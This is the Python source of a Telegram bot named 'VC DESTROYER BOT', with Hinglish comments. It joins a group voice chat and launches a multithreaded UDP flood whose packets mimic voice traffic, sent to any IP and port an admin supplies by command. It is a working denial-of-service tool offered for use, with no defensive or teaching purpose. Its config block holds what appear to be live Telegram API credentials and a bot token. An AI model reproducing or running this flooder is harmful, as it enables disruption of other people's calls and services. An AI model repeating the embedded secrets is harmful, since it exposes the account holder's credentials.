import asyncio
import socket
import time
import os
import random
from threading import Thread
from pyrogram import Client, filters
from pyrogram.raw import functions, types

# ===================== CONFIG =====================
API_ID = 37460343  # CHANGE KARO
API_HASH = "cf2d690b275e8d53a51fc69a15270437"  # CHANGE KARO
BOT_TOKEN = "8649236048:AAGcrxGdeSZpwcjtuMF-9zDKzyVISml-yNQ"  # CHANGE KARO
ADMIN_ID = 8819216195  # CHANGE KARO

bot = Client("udp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ===================== VC + ATTACK ENGINE =====================
class VCAttack:
    def __init__(self):
        self.running = False
        self.threads = 1000
        self.packets = 0
        self.chat_id = None
        self.call = None
        
    async def join_vc(self, chat_id):
        """Voice Chat mein join karo"""
        try:
            # Peer resolve karo
            peer = await bot.resolve_peer(chat_id)
            
            # Call join karo
            self.call = await bot.invoke(
                functions.phone.JoinGroupCall(
                    call=types.InputGroupCall(
                        id=0,  # Auto detect
                        access_hash=0
                    ),
                    join_as=peer,
                    params=types.DataJSON(data='{"ufrag":"test","pwd":"test"}')
                )
            )
            self.chat_id = chat_id
            return True
        except Exception as e:
            print(f"VC Join Error: {e}")
            return False
            
    def start_udp(self, ip, port, duration):
        """Andar se UDP flood"""
        self.running = True
        self.packets = 0
        
        # 🔥 SPECIAL VC PAYLOADS (Telegram Voice format mimic)
        payloads = []
        for _ in range(50):
            payload = os.urandom(1200) + b'\x00\x01\x02\x03'  # Voice packet mimic
            payloads.append(payload)
            
        end = time.time() + duration
        
        def flood():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # 🔥 CRITICAL: Telegram voice port par priority packet bhejo
            while time.time() < end and self.running:
                try:
                    p = random.choice(payloads)
                    # 10 packets ek sath (Voice channe flood)
                    for _ in range(10):
                        s.sendto(p, (ip, port))
                        self.packets += 1
                except:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
        for _ in range(self.threads):
            Thread(target=flood, daemon=True).start()
            
        return f"🔥 INSIDE VC ATTACK ON {ip}:{port} STARTED!"
    
    def stop(self):
        self.running = False
        return f"🛑 STOPPED! Packets: {self.packets:,}"

attack = VCAttack()

# ===================== COMMANDS =====================

@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client, msg):
    await msg.reply(
        "💀 **VC DESTROYER BOT READY!**\n\n"
        "1️⃣ Pehle `/joinvc` karo (VC mein ghusne ke liye)\n"
        "2️⃣ Phir `/attack IP PORT DURATION`\n\n"
        "🔥 600 seconds (10 min) do for BEST EFFECT!"
    )

@bot.on_message(filters.command("joinvc") & filters.private)
async def join_vc_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    
    try:
        chat_id = msg.text.split()[1]  # /joinvc -100123456789
    except:
        return await msg.reply("❌ USAGE: `/joinvc GROUP_ID`")
    
    await msg.reply("⏳ JOINING VOICE CHAT...")
    status = await attack.join_vc(int(chat_id))
    
    if status:
        await msg.reply("✅ **BOT JOINED VC!** Ab `/attack` karo!")
    else:
        await msg.reply("❌ VC JOIN FAILED! Check permissions")

@bot.on_message(filters.command("attack") & filters.private)
async def attack_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply("❌ `/attack IP PORT DURATION`")
    
    ip, port, duration = parts[1], int(parts[2]), int(parts[3])
    
    if attack.running:
        return await msg.reply("⚠️ ATTACK RUNNING! Use `/stop`")
    
    msg1 = await msg.reply(f"⏳ STARTING VC ATTACK...")
    result = attack.start_udp(ip, port, duration)
    await msg1.edit_text(f"{result}\n⏱️ {duration}s\n🧵 {attack.threads} THREADS\n🎯 INSIDE VC!")

@bot.on_message(filters.command("stop") & filters.private)
async def stop_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    await msg.reply(attack.stop())

@bot.on_message(filters.command("status") & filters.private)
async def status_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    await msg.reply(f"📊 **VC STATUS**\n🟢 RUNNING: {attack.running}\n📦 PACKETS: {attack.packets:,}")

@bot.on_message(filters.command("threads") & filters.private)
async def threads_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    parts = msg.text.split()
    if len(parts) < 2:
        return await msg.reply(f"CURRENT: {attack.threads}")
    attack.threads = int(parts[1])
    await msg.reply(f"✅ THREADS: {attack.threads}")

print("💀 VC DESTROYER BOT STARTED!")
bot.run()
